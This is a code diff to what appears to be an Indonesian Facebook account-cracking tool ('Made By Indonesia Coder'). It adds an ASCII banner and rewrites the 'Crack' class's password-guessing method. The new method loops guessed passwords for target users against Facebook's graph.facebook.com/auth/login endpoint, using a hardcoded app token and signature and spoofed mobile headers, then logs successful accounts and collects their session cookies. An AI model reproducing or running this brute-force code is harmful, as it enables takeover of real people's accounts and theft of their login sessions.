@@ -54,7 +54,16 @@ class Logo:
 	###----------[ LOGO ]---------- ###
 	def logonya(self):
 		self.bersihkan_layar()
-		prints(Panel(f"""{color_text} y""",width=80,style=f"{color_panel}"))
+		prints(Panel(f"""{color_text} ________   ___      ___  _______    _______  
+("      "\ |"  \    /"  ||   _  "\  /"     "|  {M2}██████████████████████[/]
+ \___/   :) \   \  //   |(. |_)  :)(: ______)  {M2}██████████████████████[/]
+   /  ___/  /\\  \/.    ||:     \/  \/    |     {P2}██████████████████████[/]
+  //  \__  |: \.        |(|  _  \\  // ___)     {P2}██████████████████████[/]
+ (:   / "\ |.  \    /:  ||: |_)  :)(:  (      
+  \_______)|___|\__/|___|(_______/  \__/      Made By {M2}Indonesia {P2}Coder
+{B2}╭──────────────────────╮{B2}╭───────────────╮{B2}╭────────────────────────────╮
+{B2}│ {P2}Author : Fall Xavier {B2}│{B2}│ {P2}Version : 2.0 {B2}│{B2}│ {P2}Dont't Recode My Tools Bro {B2}│
+{B2}╰──────────────────────╯{B2}╰───────────────╯{B2}╰────────────────────────────╯""",width=80,style=f"{color_panel}"))
 	
 ###----------[ BAGIAN LOGIN ]---------- ###
 class Login:
@@ -385,35 +394,30 @@ class Crack:
 	def metode_api(self,user,pwx):
 		prog.update(des,description=f" {H2}•{P2} crack {H2}aman{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
 		prog.advance(des)
-		#url = 'mbasic.facebook.com'
 		try:
 			for pw in pwx:
 				pw = pw.lower()
-				link = ses.get(f"https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&refsrc=de1precated&_rdr")
-				params = {"lsd":re.search('name="lsd" value="(.*?)"',
-				str(link.text)).group(1),
-				"jazoest":re.search('name="jazoest" value="(.*?)"', 
-				str(link.text)).group(1),
-				"email":user,
-				"pass":pw,
-				"next":""
-			}
-				headers = {
-					'accept': '*/*',
-					'accept-encoding': 'gzip, deflate, br', 
-					'accept-language': 'id,en-US;q=0.9,en;q=0.8', 
-					'content-type': 'application/x-www-form-urlencoded','Host': 'https://mbasic.facebook.com', 
-					'origin': 'https://mbasic.facebook.com', 
-					'referer': 'https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&refsrc=de1precated&_rdr', 
-					'user-agent': Session().generate_ugent(), 
-					'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
-					'sec-ch-ua-mobile': '?0',
-					'sec-fetch-dest': 'empty', 
-					'sec-fetch-mode': 'cors',
-					'sec-fetch-site': 'same-origin',
-					'x-requested-with': 'XMLHttpRequest'
+				params = {
+					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
+					"sdk_version": {random.randint(1,26)}, 
+					"email": user,
+					"locale": "ja_JP",
+					"password": pw,
+					"sdk": "android",
+					"generate_session_cookies": "1",
+					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
 				}
-				post = ses.post(f"https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100",params=params, headers=headers, allow_redirects=False)
+				headers = {
+					"Host": "graph.facebook.com",
+					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+					"x-fb-sim-hni": str(random.randint(20000, 40000)),
+					"x-fb-net-hni": str(random.randint(20000, 40000)),
+					"x-fb-connection-quality": "EXCELLENT",
+					"user-agent": Session().generate_ugent(),
+					"content-type": "application/x-www-form-urlencoded",
+					"x-fb-http-engine": "Liger"
+				}
+				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					self.ok.append(user)
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
